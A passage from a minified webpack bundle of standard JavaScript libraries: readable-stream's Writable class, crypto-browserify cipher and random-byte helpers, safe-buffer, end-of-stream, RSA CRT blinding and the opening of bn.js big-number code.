            (exports.sha224 = __webpack_require__(202)),
            (exports.sha256 = __webpack_require__(89)),
            (exports.sha384 = __webpack_require__(203)),
            (exports.sha512 = __webpack_require__(90));
    },
    function (module, exports, __webpack_require__) {
        ((exports = module.exports = __webpack_require__(91)).Stream = exports),
            (exports.Readable = exports),
            (exports.Writable = __webpack_require__(50)),
            (exports.Duplex = __webpack_require__(22)),
            (exports.Transform = __webpack_require__(94)),
            (exports.PassThrough = __webpack_require__(210));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (process, setImmediate, global) {
            var pna = __webpack_require__(38);
            function CorkedRequest(state) {
                var _this = this;
                (this.next = null),
                    (this.entry = null),
                    (this.finish = function () {
                        !(function (corkReq, state, err) {
                            var entry = corkReq.entry;
                            corkReq.entry = null;
                            for (; entry; ) {
                                var cb = entry.callback;
                                state.pendingcb--, cb(err), (entry = entry.next);
                            }
                            state.corkedRequestsFree ? (state.corkedRequestsFree.next = corkReq) : (state.corkedRequestsFree = corkReq);
                        })(_this, state);
                    });
            }
            module.exports = Writable;
            var Duplex,
                asyncWrite = !process.browser && ["v0.10", "v0.9."].indexOf(process.version.slice(0, 5)) > -1 ? setImmediate : pna.nextTick;
            Writable.WritableState = WritableState;
            var util = Object.create(__webpack_require__(34));
            util.inherits = __webpack_require__(3);
            var internalUtil = { deprecate: __webpack_require__(45) },
                Stream = __webpack_require__(92),
                Buffer = __webpack_require__(5).Buffer,
                OurUint8Array = global.Uint8Array || function () {};
            var realHasInstance,
                destroyImpl = __webpack_require__(93);
            function nop() {}
            function WritableState(options, stream) {
                (Duplex = Duplex || __webpack_require__(22)), (options = options || {});
                var isDuplex = stream instanceof Duplex;
                (this.objectMode = !!options.objectMode), isDuplex && (this.objectMode = this.objectMode || !!options.writableObjectMode);
                var hwm = options.highWaterMark,
                    writableHwm = options.writableHighWaterMark,
                    defaultHwm = this.objectMode ? 16 : 16384;
                (this.highWaterMark = hwm || 0 === hwm ? hwm : isDuplex && (writableHwm || 0 === writableHwm) ? writableHwm : defaultHwm),
                    (this.highWaterMark = Math.floor(this.highWaterMark)),
                    (this.finalCalled = !1),
                    (this.needDrain = !1),
                    (this.ending = !1),
                    (this.ended = !1),
                    (this.finished = !1),
                    (this.destroyed = !1);
                var noDecode = !1 === options.decodeStrings;
                (this.decodeStrings = !noDecode),
                    (this.defaultEncoding = options.defaultEncoding || "utf8"),
                    (this.length = 0),
                    (this.writing = !1),
                    (this.corked = 0),
                    (this.sync = !0),
                    (this.bufferProcessing = !1),
                    (this.onwrite = function (er) {
                        !(function (stream, er) {
                            var state = stream._writableState,
                                sync = state.sync,
                                cb = state.writecb;
                            if (
                                ((function (state) {
                                    (state.writing = !1), (state.writecb = null), (state.length -= state.writelen), (state.writelen = 0);
                                })(state),
                                er)
                            )
                                !(function (stream, state, sync, er, cb) {
                                    --state.pendingcb,
                                        sync
                                            ? (pna.nextTick(cb, er), pna.nextTick(finishMaybe, stream, state), (stream._writableState.errorEmitted = !0), stream.emit("error", er))
                                            : (cb(er), (stream._writableState.errorEmitted = !0), stream.emit("error", er), finishMaybe(stream, state));
                                })(stream, state, sync, er, cb);
                            else {
                                var finished = needFinish(state);
                                finished || state.corked || state.bufferProcessing || !state.bufferedRequest || clearBuffer(stream, state),
                                    sync ? asyncWrite(afterWrite, stream, state, finished, cb) : afterWrite(stream, state, finished, cb);
                            }
                        })(stream, er);
                    }),
                    (this.writecb = null),
                    (this.writelen = 0),
                    (this.bufferedRequest = null),
                    (this.lastBufferedRequest = null),
                    (this.pendingcb = 0),
                    (this.prefinished = !1),
                    (this.errorEmitted = !1),
                    (this.bufferedRequestCount = 0),
                    (this.corkedRequestsFree = new CorkedRequest(this));
            }
            function Writable(options) {
                if (((Duplex = Duplex || __webpack_require__(22)), !(realHasInstance.call(Writable, this) || this instanceof Duplex))) return new Writable(options);
                (this._writableState = new WritableState(options, this)),
                    (this.writable = !0),
                    options &&
                        ("function" == typeof options.write && (this._write = options.write),
                        "function" == typeof options.writev && (this._writev = options.writev),
                        "function" == typeof options.destroy && (this._destroy = options.destroy),
                        "function" == typeof options.final && (this._final = options.final)),
                    Stream.call(this);
            }
            function doWrite(stream, state, writev, len, chunk, encoding, cb) {
                (state.writelen = len), (state.writecb = cb), (state.writing = !0), (state.sync = !0), writev ? stream._writev(chunk, state.onwrite) : stream._write(chunk, encoding, state.onwrite), (state.sync = !1);
            }
            function afterWrite(stream, state, finished, cb) {
                finished ||
                    (function (stream, state) {
                        0 === state.length && state.needDrain && ((state.needDrain = !1), stream.emit("drain"));
                    })(stream, state),
                    state.pendingcb--,
                    cb(),
                    finishMaybe(stream, state);
            }
            function clearBuffer(stream, state) {
                state.bufferProcessing = !0;
                var entry = state.bufferedRequest;
                if (stream._writev && entry && entry.next) {
                    var l = state.bufferedRequestCount,
                        buffer = new Array(l),
                        holder = state.corkedRequestsFree;
                    holder.entry = entry;
                    for (var count = 0, allBuffers = !0; entry; ) (buffer[count] = entry), entry.isBuf || (allBuffers = !1), (entry = entry.next), (count += 1);
                    (buffer.allBuffers = allBuffers),
                        doWrite(stream, state, !0, state.length, buffer, "", holder.finish),
                        state.pendingcb++,
                        (state.lastBufferedRequest = null),
                        holder.next ? ((state.corkedRequestsFree = holder.next), (holder.next = null)) : (state.corkedRequestsFree = new CorkedRequest(state)),
                        (state.bufferedRequestCount = 0);
                } else {
                    for (; entry; ) {
                        var chunk = entry.chunk,
                            encoding = entry.encoding,
                            cb = entry.callback;
                        if ((doWrite(stream, state, !1, state.objectMode ? 1 : chunk.length, chunk, encoding, cb), (entry = entry.next), state.bufferedRequestCount--, state.writing)) break;
                    }
                    null === entry && (state.lastBufferedRequest = null);
                }
                (state.bufferedRequest = entry), (state.bufferProcessing = !1);
            }
            function needFinish(state) {
                return state.ending && 0 === state.length && null === state.bufferedRequest && !state.finished && !state.writing;
            }
            function callFinal(stream, state) {
                stream._final(function (err) {
                    state.pendingcb--, err && stream.emit("error", err), (state.prefinished = !0), stream.emit("prefinish"), finishMaybe(stream, state);
                });
            }
            function finishMaybe(stream, state) {
                var need = needFinish(state);
                return (
                    need &&
                        (!(function (stream, state) {
                            state.prefinished ||
                                state.finalCalled ||
                                ("function" == typeof stream._final ? (state.pendingcb++, (state.finalCalled = !0), pna.nextTick(callFinal, stream, state)) : ((state.prefinished = !0), stream.emit("prefinish")));
                        })(stream, state),
                        0 === state.pendingcb && ((state.finished = !0), stream.emit("finish"))),
                    need
                );
            }
            util.inherits(Writable, Stream),
                (WritableState.prototype.getBuffer = function () {
                    for (var current = this.bufferedRequest, out = []; current; ) out.push(current), (current = current.next);
                    return out;
                }),
                (function () {
                    try {
                        Object.defineProperty(WritableState.prototype, "buffer", {
                            get: internalUtil.deprecate(
                                function () {
                                    return this.getBuffer();
                                },
                                "_writableState.buffer is deprecated. Use _writableState.getBuffer instead.",
                                "DEP0003"
                            ),
                        });
                    } catch (_) {}
                })(),
                "function" == typeof Symbol && Symbol.hasInstance && "function" == typeof Function.prototype[Symbol.hasInstance]
                    ? ((realHasInstance = Function.prototype[Symbol.hasInstance]),
                      Object.defineProperty(Writable, Symbol.hasInstance, {
                          value: function (object) {
                              return !!realHasInstance.call(this, object) || (this === Writable && object && object._writableState instanceof WritableState);
                          },
                      }))
                    : (realHasInstance = function (object) {
                          return object instanceof this;
                      }),
                (Writable.prototype.pipe = function () {
                    this.emit("error", new Error("Cannot pipe, not readable"));
                }),
                (Writable.prototype.write = function (chunk, encoding, cb) {
                    var obj,
                        state = this._writableState,
                        ret = !1,
                        isBuf = !state.objectMode && ((obj = chunk), Buffer.isBuffer(obj) || obj instanceof OurUint8Array);
                    return (
                        isBuf &&
                            !Buffer.isBuffer(chunk) &&
                            (chunk = (function (chunk) {
                                return Buffer.from(chunk);
                            })(chunk)),
                        "function" == typeof encoding && ((cb = encoding), (encoding = null)),
                        isBuf ? (encoding = "buffer") : encoding || (encoding = state.defaultEncoding),
                        "function" != typeof cb && (cb = nop),
                        state.ended
                            ? (function (stream, cb) {
                                  var er = new Error("write after end");
                                  stream.emit("error", er), pna.nextTick(cb, er);
                              })(this, cb)
                            : (isBuf ||
                                  (function (stream, state, chunk, cb) {
                                      var valid = !0,
                                          er = !1;
                                      return (
                                          null === chunk
                                              ? (er = new TypeError("May not write null values to stream"))
                                              : "string" == typeof chunk || void 0 === chunk || state.objectMode || (er = new TypeError("Invalid non-string/buffer chunk")),
                                          er && (stream.emit("error", er), pna.nextTick(cb, er), (valid = !1)),
                                          valid
                                      );
                                  })(this, state, chunk, cb)) &&
                              (state.pendingcb++,
                              (ret = (function (stream, state, isBuf, chunk, encoding, cb) {
                                  if (!isBuf) {
                                      var newChunk = (function (state, chunk, encoding) {
                                          state.objectMode || !1 === state.decodeStrings || "string" != typeof chunk || (chunk = Buffer.from(chunk, encoding));
                                          return chunk;
                                      })(state, chunk, encoding);
                                      chunk !== newChunk && ((isBuf = !0), (encoding = "buffer"), (chunk = newChunk));
                                  }
                                  var len = state.objectMode ? 1 : chunk.length;
                                  state.length += len;
                                  var ret = state.length < state.highWaterMark;
                                  ret || (state.needDrain = !0);
                                  if (state.writing || state.corked) {
                                      var last = state.lastBufferedRequest;
                                      (state.lastBufferedRequest = { chunk: chunk, encoding: encoding, isBuf: isBuf, callback: cb, next: null }),
                                          last ? (last.next = state.lastBufferedRequest) : (state.bufferedRequest = state.lastBufferedRequest),
                                          (state.bufferedRequestCount += 1);
                                  } else doWrite(stream, state, !1, len, chunk, encoding, cb);
                                  return ret;
                              })(this, state, isBuf, chunk, encoding, cb))),
                        ret
                    );
                }),
                (Writable.prototype.cork = function () {
                    this._writableState.corked++;
                }),
                (Writable.prototype.uncork = function () {
                    var state = this._writableState;
                    state.corked && (state.corked--, state.writing || state.corked || state.finished || state.bufferProcessing || !state.bufferedRequest || clearBuffer(this, state));
                }),
                (Writable.prototype.setDefaultEncoding = function (encoding) {
                    if (
                        ("string" == typeof encoding && (encoding = encoding.toLowerCase()),
                        !(["hex", "utf8", "utf-8", "ascii", "binary", "base64", "ucs2", "ucs-2", "utf16le", "utf-16le", "raw"].indexOf((encoding + "").toLowerCase()) > -1))
                    )
                        throw new TypeError("Unknown encoding: " + encoding);
                    return (this._writableState.defaultEncoding = encoding), this;
                }),
                Object.defineProperty(Writable.prototype, "writableHighWaterMark", {
                    enumerable: !1,
                    get: function () {
                        return this._writableState.highWaterMark;
                    },
                }),
                (Writable.prototype._write = function (chunk, encoding, cb) {
                    cb(new Error("_write() is not implemented"));
                }),
                (Writable.prototype._writev = null),
                (Writable.prototype.end = function (chunk, encoding, cb) {
                    var state = this._writableState;
                    "function" == typeof chunk ? ((cb = chunk), (chunk = null), (encoding = null)) : "function" == typeof encoding && ((cb = encoding), (encoding = null)),
                        null != chunk && this.write(chunk, encoding),
                        state.corked && ((state.corked = 1), this.uncork()),
                        state.ending ||
                            state.finished ||
                            (function (stream, state, cb) {
                                (state.ending = !0), finishMaybe(stream, state), cb && (state.finished ? pna.nextTick(cb) : stream.once("finish", cb));
                                (state.ended = !0), (stream.writable = !1);
                            })(this, state, cb);
                }),
                Object.defineProperty(Writable.prototype, "destroyed", {
                    get: function () {
                        return void 0 !== this._writableState && this._writableState.destroyed;
                    },
                    set: function (value) {
                        this._writableState && (this._writableState.destroyed = value);
                    },
                }),
                (Writable.prototype.destroy = destroyImpl.destroy),
                (Writable.prototype._undestroy = destroyImpl.undestroy),
                (Writable.prototype._destroy = function (err, cb) {
                    this.end(), cb(err);
                });
        }.call(this, __webpack_require__(7), __webpack_require__(208).setImmediate, __webpack_require__(8)));
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var assert = __webpack_require__(11);
        function Cipher(options) {
            (this.options = options), (this.type = this.options.type), (this.blockSize = 8), this._init(), (this.buffer = new Array(this.blockSize)), (this.bufferOff = 0);
        }
        (module.exports = Cipher),
            (Cipher.prototype._init = function () {}),
            (Cipher.prototype.update = function (data) {
                return 0 === data.length ? [] : "decrypt" === this.type ? this._updateDecrypt(data) : this._updateEncrypt(data);
            }),
            (Cipher.prototype._buffer = function (data, off) {
                for (var min = Math.min(this.buffer.length - this.bufferOff, data.length - off), i = 0; i < min; i++) this.buffer[this.bufferOff + i] = data[off + i];
                return (this.bufferOff += min), min;
            }),
            (Cipher.prototype._flushBuffer = function (out, off) {
                return this._update(this.buffer, 0, out, off), (this.bufferOff = 0), this.blockSize;
            }),
            (Cipher.prototype._updateEncrypt = function (data) {
                var inputOff = 0,
                    outputOff = 0,
                    count = ((this.bufferOff + data.length) / this.blockSize) | 0,
                    out = new Array(count * this.blockSize);
                0 !== this.bufferOff && ((inputOff += this._buffer(data, inputOff)), this.bufferOff === this.buffer.length && (outputOff += this._flushBuffer(out, outputOff)));
                for (var max = data.length - ((data.length - inputOff) % this.blockSize); inputOff < max; inputOff += this.blockSize) this._update(data, inputOff, out, outputOff), (outputOff += this.blockSize);
                for (; inputOff < data.length; inputOff++, this.bufferOff++) this.buffer[this.bufferOff] = data[inputOff];
                return out;
            }),
            (Cipher.prototype._updateDecrypt = function (data) {
                for (var inputOff = 0, outputOff = 0, count = Math.ceil((this.bufferOff + data.length) / this.blockSize) - 1, out = new Array(count * this.blockSize); count > 0; count--)
                    (inputOff += this._buffer(data, inputOff)), (outputOff += this._flushBuffer(out, outputOff));
                return (inputOff += this._buffer(data, inputOff)), out;
            }),
            (Cipher.prototype.final = function (buffer) {
                var first, last;
                return buffer && (first = this.update(buffer)), (last = "encrypt" === this.type ? this._finalEncrypt() : this._finalDecrypt()), first ? first.concat(last) : last;
            }),
            (Cipher.prototype._pad = function (buffer, off) {
                if (0 === off) return !1;
                for (; off < buffer.length; ) buffer[off++] = 0;
                return !0;
            }),
            (Cipher.prototype._finalEncrypt = function () {
                if (!this._pad(this.buffer, this.bufferOff)) return [];
                var out = new Array(this.blockSize);
                return this._update(this.buffer, 0, out, 0), out;
            }),
            (Cipher.prototype._unpad = function (buffer) {
                return buffer;
            }),
            (Cipher.prototype._finalDecrypt = function () {
                assert.equal(this.bufferOff, this.blockSize, "Not enough data to decrypt");
                var out = new Array(this.blockSize);
                return this._flushBuffer(out, 0), this._unpad(out);
            });
    },
    function (module, exports, __webpack_require__) {
        var ciphers = __webpack_require__(223),
            deciphers = __webpack_require__(231),
            modes = __webpack_require__(107);
        (exports.createCipher = exports.Cipher = ciphers.createCipher),
            (exports.createCipheriv = exports.Cipheriv = ciphers.createCipheriv),
            (exports.createDecipher = exports.Decipher = deciphers.createDecipher),
            (exports.createDecipheriv = exports.Decipheriv = deciphers.createDecipheriv),
            (exports.listCiphers = exports.getCiphers = function () {
                return Object.keys(modes);
            });
    },
    function (module, exports, __webpack_require__) {
        var modeModules = {
                ECB: __webpack_require__(224),
                CBC: __webpack_require__(225),
                CFB: __webpack_require__(226),
                CFB8: __webpack_require__(227),
                CFB1: __webpack_require__(228),
                OFB: __webpack_require__(229),
                CTR: __webpack_require__(105),
                GCM: __webpack_require__(105),
            },
            modes = __webpack_require__(107);
        for (var key in modes) modes[key].module = modeModules[modes[key].mode];
        module.exports = modes;
    },
    function (module, exports, __webpack_require__) {
        var r;
        function Rand(rand) {
            this.rand = rand;
        }
        if (
            ((module.exports = function (len) {
                return r || (r = new Rand(null)), r.generate(len);
            }),
            (module.exports.Rand = Rand),
            (Rand.prototype.generate = function (len) {
                return this._rand(len);
            }),
            (Rand.prototype._rand = function (n) {
                if (this.rand.getBytes) return this.rand.getBytes(n);
                for (var res = new Uint8Array(n), i = 0; i < res.length; i++) res[i] = this.rand.getByte();
                return res;
            }),
            "object" == typeof self)
        )
            self.crypto && self.crypto.getRandomValues
                ? (Rand.prototype._rand = function (n) {
                      var arr = new Uint8Array(n);
                      return self.crypto.getRandomValues(arr), arr;
                  })
                : self.msCrypto && self.msCrypto.getRandomValues
                ? (Rand.prototype._rand = function (n) {
                      var arr = new Uint8Array(n);
                      return self.msCrypto.getRandomValues(arr), arr;
                  })
                : "object" == typeof window &&
                  (Rand.prototype._rand = function () {
                      throw new Error("Not implemented yet");
                  });
        else
            try {
                var crypto = __webpack_require__(237);
                if ("function" != typeof crypto.randomBytes) throw new Error("Not supported");
                Rand.prototype._rand = function (n) {
                    return crypto.randomBytes(n);
                };
            } catch (e) {}
    },
    function (module, exports, __webpack_require__) {
        var buffer = __webpack_require__(6),
            Buffer = buffer.Buffer;
        function copyProps(src, dst) {
            for (var key in src) dst[key] = src[key];
        }
        function SafeBuffer(arg, encodingOrOffset, length) {
            return Buffer(arg, encodingOrOffset, length);
        }
        Buffer.from && Buffer.alloc && Buffer.allocUnsafe && Buffer.allocUnsafeSlow ? (module.exports = buffer) : (copyProps(buffer, exports), (exports.Buffer = SafeBuffer)),
            (SafeBuffer.prototype = Object.create(Buffer.prototype)),
            copyProps(Buffer, SafeBuffer),
            (SafeBuffer.from = function (arg, encodingOrOffset, length) {
                if ("number" == typeof arg) throw new TypeError("Argument must not be a number");
                return Buffer(arg, encodingOrOffset, length);
            }),
            (SafeBuffer.alloc = function (size, fill, encoding) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                var buf = Buffer(size);
                return void 0 !== fill ? ("string" == typeof encoding ? buf.fill(fill, encoding) : buf.fill(fill)) : buf.fill(0), buf;
            }),
            (SafeBuffer.allocUnsafe = function (size) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                return Buffer(size);
            }),
            (SafeBuffer.allocUnsafeSlow = function (size) {
                if ("number" != typeof size) throw new TypeError("Argument must be a number");
                return buffer.SlowBuffer(size);
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        var ERR_STREAM_PREMATURE_CLOSE = __webpack_require__(28).codes.ERR_STREAM_PREMATURE_CLOSE;
        function noop() {}
        module.exports = function eos(stream, opts, callback) {
            if ("function" == typeof opts) return eos(stream, null, opts);
            opts || (opts = {}),
                (callback = (function (callback) {
                    var called = !1;
                    return function () {
                        if (!called) {
                            called = !0;
                            for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) args[_key] = arguments[_key];
                            callback.apply(this, args);
                        }
                    };
                })(callback || noop));
            var readable = opts.readable || (!1 !== opts.readable && stream.readable),
                writable = opts.writable || (!1 !== opts.writable && stream.writable),
                onlegacyfinish = function () {
                    stream.writable || onfinish();
                },
                writableEnded = stream._writableState && stream._writableState.finished,
                onfinish = function () {
                    (writable = !1), (writableEnded = !0), readable || callback.call(stream);
                },
                readableEnded = stream._readableState && stream._readableState.endEmitted,
                onend = function () {
                    (readable = !1), (readableEnded = !0), writable || callback.call(stream);
                },
                onerror = function (err) {
                    callback.call(stream, err);
                },
                onclose = function () {
                    var err;
                    return readable && !readableEnded
                        ? ((stream._readableState && stream._readableState.ended) || (err = new ERR_STREAM_PREMATURE_CLOSE()), callback.call(stream, err))
                        : writable && !writableEnded
                        ? ((stream._writableState && stream._writableState.ended) || (err = new ERR_STREAM_PREMATURE_CLOSE()), callback.call(stream, err))
                        : void 0;
                },
                onrequest = function () {
                    stream.req.on("finish", onfinish);
                };
            return (
                !(function (stream) {
                    return stream.setHeader && "function" == typeof stream.abort;
                })(stream)
                    ? writable && !stream._writableState && (stream.on("end", onlegacyfinish), stream.on("close", onlegacyfinish))
                    : (stream.on("complete", onfinish), stream.on("abort", onclose), stream.req ? onrequest() : stream.on("request", onrequest)),
                stream.on("end", onend),
                stream.on("finish", onfinish),
                !1 !== opts.error && stream.on("error", onerror),
                stream.on("close", onclose),
                function () {
                    stream.removeListener("complete", onfinish),
                        stream.removeListener("abort", onclose),
                        stream.removeListener("request", onrequest),
                        stream.req && stream.req.removeListener("finish", onfinish),
                        stream.removeListener("end", onlegacyfinish),
                        stream.removeListener("close", onlegacyfinish),
                        stream.removeListener("finish", onfinish),
                        stream.removeListener("end", onend),
                        stream.removeListener("error", onerror),
                        stream.removeListener("close", onclose);
                }
            );
        };
    },
    function (module, exports, __webpack_require__) {
        (function (Buffer) {
            var BN = __webpack_require__(58),
                randomBytes = __webpack_require__(24);
            function getr(priv) {
                var r,
                    len = priv.modulus.byteLength();
                do {
                    r = new BN(randomBytes(len));
                } while (r.cmp(priv.modulus) >= 0 || !r.umod(priv.prime1) || !r.umod(priv.prime2));
                return r;
            }
            function crt(msg, priv) {
                var blinds = (function (priv) {
                        var r = getr(priv);
                        return { blinder: r.toRed(BN.mont(priv.modulus)).redPow(new BN(priv.publicExponent)).fromRed(), unblinder: r.invm(priv.modulus) };
                    })(priv),
                    len = priv.modulus.byteLength(),
                    blinded = new BN(msg).mul(blinds.blinder).umod(priv.modulus),
                    c1 = blinded.toRed(BN.mont(priv.prime1)),
                    c2 = blinded.toRed(BN.mont(priv.prime2)),
                    qinv = priv.coefficient,
                    p = priv.prime1,
                    q = priv.prime2,
                    m1 = c1.redPow(priv.exponent1).fromRed(),
                    m2 = c2.redPow(priv.exponent2).fromRed(),
                    h = m1.isub(m2).imul(qinv).umod(p).imul(q);
                return m2.iadd(h).imul(blinds.unblinder).umod(priv.modulus).toArrayLike(Buffer, "be", len);
            }
            (crt.getr = getr), (module.exports = crt);
        }.call(this, __webpack_require__(6).Buffer));
    },
    function (module, exports, __webpack_require__) {
        (function (module) {
            !(function (module, exports) {
                "use strict";
                function assert(val, msg) {
                    if (!val) throw new Error(msg || "Assertion failed");
                }
                function inherits(ctor, superCtor) {
                    ctor.super_ = superCtor;
                    var TempCtor = function () {};
                    (TempCtor.prototype = superCtor.prototype), (ctor.prototype = new TempCtor()), (ctor.prototype.constructor = ctor);
                }
                function BN(number, base, endian) {
                    if (BN.isBN(number)) return number;
                    (this.negative = 0),
                        (this.words = null),
                        (this.length = 0),
                        (this.red = null),
                        null !== number && (("le" !== base && "be" !== base) || ((endian = base), (base = 10)), this._init(number || 0, base || 10, endian || "be"));
                }
                var Buffer;
                "object" == typeof module ? (module.exports = BN) : (exports.BN = BN), (BN.BN = BN), (BN.wordSize = 26);
                try {
                    Buffer = "undefined" != typeof window && void 0 !== window.Buffer ? window.Buffer : __webpack_require__(250).Buffer;
                } catch (e) {}
                function parseHex4Bits(string, index) {
                    var c = string.charCodeAt(index);
                    return c >= 48 && c <= 57 ? c - 48 : c >= 65 && c <= 70 ? c - 55 : c >= 97 && c <= 102 ? c - 87 : void assert(!1, "Invalid character in " + string);
                }
                function parseHexByte(string, lowerBound, index) {
                    var r = parseHex4Bits(string, index);
                    return index - 1 >= lowerBound && (r |= parseHex4Bits(string, index - 1) << 4), r;
                }
                function parseBase(str, start, end, mul) {
                    for (var r = 0, b = 0, len = Math.min(str.length, end), i = start; i < len; i++) {
                        var c = str.charCodeAt(i) - 48;
                        (r *= mul), (b = c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c), assert(c >= 0 && b < mul, "Invalid character"), (r += b);
                    }
                    return r;
                }
                function move(dest, src) {
                    (dest.words = src.words), (dest.length = src.length), (dest.negative = src.negative), (dest.red = src.red);
                }
                if (
                    ((BN.isBN = function (num) {
                        return num instanceof BN || (null !== num && "object" == typeof num && num.constructor.wordSize === BN.wordSize && Array.isArray(num.words));
                    }),
                    (BN.max = function (left, right) {
                        return left.cmp(right) > 0 ? left : right;
                    }),
                    (BN.min = function (left, right) {
                        return left.cmp(right) < 0 ? left : right;
                    }),
                    (BN.prototype._init = function (number, base, endian) {
                        if ("number" == typeof number) return this._initNumber(number, base, endian);
                        if ("object" == typeof number) return this._initArray(number, base, endian);
                        "hex" === base && (base = 16), assert(base === (0 | base) && base >= 2 && base <= 36);
                        var start = 0;
                        "-" === (number = number.toString().replace(/\s+/g, ""))[0] && (start++, (this.negative = 1)),
                            start < number.length && (16 === base ? this._parseHex(number, start, endian) : (this._parseBase(number, base, start), "le" === endian && this._initArray(this.toArray(), base, endian)));
                    }),
                    (BN.prototype._initNumber = function (number, base, endian) {
                        number < 0 && ((this.negative = 1), (number = -number)),
                            number < 67108864
                                ? ((this.words = [67108863 & number]), (this.length = 1))
                                : number < 4503599627370496
                                ? ((this.words = [67108863 & number, (number / 67108864) & 67108863]), (this.length = 2))
                                : (assert(number < 9007199254740992), (this.words = [67108863 & number, (number / 67108864) & 67108863, 1]), (this.length = 3)),
                            "le" === endian && this._initArray(this.toArray(), base, endian);
                    }),
                    (BN.prototype._initArray = function (number, base, endian) {
                        if ((assert("number" == typeof number.length), number.length <= 0)) return (this.words = [0]), (this.length = 1), this;
                        (this.length = Math.ceil(number.length / 3)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var j,
                            w,
                            off = 0;
                        if ("be" === endian)
                            for (i = number.length - 1, j = 0; i >= 0; i -= 3)
                                (w = number[i] | (number[i - 1] << 8) | (number[i - 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        else if ("le" === endian)
                            for (i = 0, j = 0; i < number.length; i += 3)
                                (w = number[i] | (number[i + 1] << 8) | (number[i + 2] << 16)), (this.words[j] |= (w << off) & 67108863), (this.words[j + 1] = (w >>> (26 - off)) & 67108863), (off += 24) >= 26 && ((off -= 26), j++);
                        return this._strip();
                    }),
                    (BN.prototype._parseHex = function (number, start, endian) {
                        (this.length = Math.ceil((number.length - start) / 6)), (this.words = new Array(this.length));
                        for (var i = 0; i < this.length; i++) this.words[i] = 0;
                        var w,
                            off = 0,
                            j = 0;
                        if ("be" === endian)
                            for (i = number.length - 1; i >= start; i -= 2) (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        else
                            for (i = (number.length - start) % 2 == 0 ? start + 1 : start; i < number.length; i += 2)
                                (w = parseHexByte(number, start, i) << off), (this.words[j] |= 67108863 & w), off >= 18 ? ((off -= 18), (j += 1), (this.words[j] |= w >>> 26)) : (off += 8);
                        this._strip();
                    }),
                    (BN.prototype._parseBase = function (number, base, start) {
                        (this.words = [0]), (this.length = 1);
                        for (var limbLen = 0, limbPow = 1; limbPow <= 67108863; limbPow *= base) limbLen++;
                        limbLen--, (limbPow = (limbPow / base) | 0);
                        for (var total = number.length - start, mod = total % limbLen, end = Math.min(total, total - mod) + start, word = 0, i = start; i < end; i += limbLen)
                            (word = parseBase(number, i, i + limbLen, base)), this.imuln(limbPow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        if (0 !== mod) {
                            var pow = 1;
                            for (word = parseBase(number, i, number.length, base), i = 0; i < mod; i++) pow *= base;
                            this.imuln(pow), this.words[0] + word < 67108864 ? (this.words[0] += word) : this._iaddn(word);
                        }
                        this._strip();
                    }),
                    (BN.prototype.copy = function (dest) {
                        dest.words = new Array(this.length);
                        for (var i = 0; i < this.length; i++) dest.words[i] = this.words[i];
                        (dest.length = this.length), (dest.negative = this.negative), (dest.red = this.red);
                    }),
                    (BN.prototype._move = function (dest) {
                        move(dest, this);
                    }),
                    (BN.prototype.clone = function () {
                        var r = new BN(null);
                        return this.copy(r), r;
                    }),
                    (BN.prototype._expand = function (size) {
                        for (; this.length < size; ) this.words[this.length++] = 0;
                        return this;
                    }),
                    (BN.prototype._strip = function () {
                        for (; this.length > 1 && 0 === this.words[this.length - 1]; ) this.length--;
                        return this._normSign();
                    }),
                    (BN.prototype._normSign = function () {
                        return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this;
                    }),
                    "undefined" != typeof Symbol && "function" == typeof Symbol.for)
                )
                    try {
                        BN.prototype[Symbol.for("nodejs.util.inspect.custom")] = inspect;
                    } catch (e) {
                        BN.prototype.inspect = inspect;
                    }
                else BN.prototype.inspect = inspect;
                function inspect() {
                    return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
                }
                var zeros = [
                        "",
                        "0",
                        "00",
                        "000",
                        "0000",
                        "00000",
                        "000000",
                        "0000000",
                        "00000000",
                        "000000000",
                        "0000000000",
                        "00000000000",
                        "000000000000",
                        "0000000000000",
                        "00000000000000",
                        "000000000000000",
                        "0000000000000000",
                        "00000000000000000",
                        "000000000000000000",
                        "0000000000000000000",
                        "00000000000000000000",
                        "000000000000000000000",
                        "0000000000000000000000",
                        "00000000000000000000000",
                        "000000000000000000000000",
                        "0000000000000000000000000",
                    ],
                    groupSizes = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                    groupBases = [
                        0,
                        0,
                        33554432,
                        43046721,
                        16777216,
                        48828125,
                        60466176,
                        40353607,
                        16777216,
                        43046721,
                        1e7,
                        19487171,
                        35831808,
                        62748517,
                        7529536,
                        11390625,
                        16777216,
                        24137569,
                        34012224,
                        47045881,
                        64e6,
                        4084101,
                        5153632,
                        6436343,
                        7962624,
                        9765625,
                        11881376,
                        14348907,
                        17210368,
                        20511149,
                        243e5,
                        28629151,
                        33554432,
                        39135393,
                        45435424,
                        52521875,
                        60466176,
                    ];
                (BN.prototype.toString = function (base, padding) {
                    var out;
                    if (((padding = 0 | padding || 1), 16 === (base = base || 10) || "hex" === base)) {
                        out = "";
                        for (var off = 0, carry = 0, i = 0; i < this.length; i++) {
                            var w = this.words[i],
                                word = (16777215 & ((w << off) | carry)).toString(16);
                            (carry = (w >>> (24 - off)) & 16777215), (off += 2) >= 26 && ((off -= 26), i--), (out = 0 !== carry || i !== this.length - 1 ? zeros[6 - word.length] + word + out : word + out);
                        }
                        for (0 !== carry && (out = carry.toString(16) + out); out.length % padding != 0; ) out = "0" + out;
                        return 0 !== this.negative && (out = "-" + out), out;
                    }
                    if (base === (0 | base) && base >= 2 && base <= 36) {
